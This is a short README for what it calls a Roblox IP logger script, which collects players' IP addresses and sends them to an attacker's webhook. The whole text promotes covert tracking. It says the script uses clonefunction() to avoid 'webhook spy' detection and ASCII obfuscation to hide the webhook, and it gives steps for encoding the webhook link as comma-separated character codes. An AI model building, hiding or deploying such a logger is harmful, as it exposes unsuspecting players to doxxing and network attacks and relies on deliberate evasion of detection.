## A roblox IP LOGGER script
* This uses clonefunction() so it can't be detected by any webhook spy
* uses ASCII obfuscation for less exposed
* this only works on executors that supports `clonefunction()` or you can remove it in exchange for your webhook to be more exposed

 ### how to use :
1. in `local _Rf4T` table; `_Xy9Z({webhook link}),` convert your webhook link using ASCII and for each letter put a comma like this "6,116,112,95,114,101,113,117,101,115"
